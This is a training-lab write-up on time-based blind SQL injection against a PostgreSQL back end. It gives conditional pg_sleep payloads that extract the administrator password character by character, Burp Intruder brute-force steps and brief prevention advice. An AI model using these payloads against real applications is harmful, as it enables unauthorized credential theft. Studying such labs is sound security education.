# 🔐 Lab 15: Blind SQL Injection with Time Delays and Information Retrieval 

## 🧩 Objective
Exploit timebased SQL injection to output the administrator password and login as administrator.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection, but does not display results or errors. Response delays are used to infer data.

## ⚙️ Payload Used
- ' || pg_sleep(10)--
- ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
- ' || (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
- ' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(-1-) END)-- 
- ' || (SELECT CASE WHEN (SUBSTRING(password,1,1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(-1-) END)--
  
## 🔎 Analysis 
1. Confirm that the parameter is vulnearble to SQL injection
2. Confirm that the user table exists in the database
3. Enumerate the password length (same as lab 11)
4. Enumerate that the administration password (same as lab 11)
 

## 🚀 Steps to Reproduce
1. Navigate to the vulnerable page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater  
4. Test delay:
   ' || pg_sleep(10)--  
5. Confirm injection using:
   ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--  
6. Extract password:
  ' || (SELECT CASE WHEN (SUBSTRING(password,1,1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(-1-) END)--  
7. Steps to use INTRUDER in BURP Suite
   1. To know password length(send the request to intruder)
      - Go to position
        - Clear all the position(which positiion you want patch, patch it and click Add button
        - set Attack type - Snipper
      - Payloads
         - payloads type : Number(set this)
         - payload option mark sequestial from from 1 to 50 and step count set 1
      - Click on Start Attack
      - Go to Result and check different length column and analyze response by message
    2. To Know exact password(send the request to intruder)
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Snipper
       - Go to Payloads
         - payloads type : Brute force(set this)
         - payload option mark count 1
       - Go to resouce pool and do same changes
       - Click on Start Attack
       - Go to Result and check different length column and analyze response by message
    3. Using two payload
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Cluster bomb
       - Go to Payloads
         - set two different payload, based on the what you perform.
       - Click on Start Attack
       - Analyze the result
       - To know the password order  the character which are displayed in the result in the serial number.
## ✅ Result
Successfully extracted the administrator password using time-based Blind SQL Injection.

## 🧠 Key Learning
Time-based SQL Injection allows full data extraction even when no output or errors are visible, by analyzing response delays.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement strict input validation  
- Limit database execution time  
- Monitor abnormal response delays  
